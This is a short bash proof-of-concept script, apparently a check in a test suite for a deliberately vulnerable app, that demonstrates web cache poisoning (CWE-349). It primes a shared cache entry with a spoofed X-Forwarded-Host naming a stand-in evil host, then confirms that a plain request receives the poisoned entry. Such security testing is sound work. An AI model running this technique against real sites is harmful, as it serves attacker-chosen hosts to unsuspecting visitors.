#!/usr/bin/env bash
# CACHE-POISON-001 (CWE-349): the /api/cache widget caches on the `key` param but
# reflects the unkeyed X-Forwarded-Host, so an attacker poisons the shared entry
# that later (header-less) visitors receive. A unique key keeps the PoC
# self-contained (and the entry expires via TTL).
set -e; . "$(dirname "$0")/_lib.sh"
K="poc-$RANDOM$RANDOM"
EVIL="evil-$K.example"
# 1) attacker primes the cache with a spoofed host
curl -s "$TARGET/api/cache?key=$K" -H "X-Forwarded-Host: $EVIL" >/dev/null
# 2) a normal visitor (no header) is served the poisoned entry on the vuln variant
curl -s "$TARGET/api/cache?key=$K" | grep -q "$EVIL"
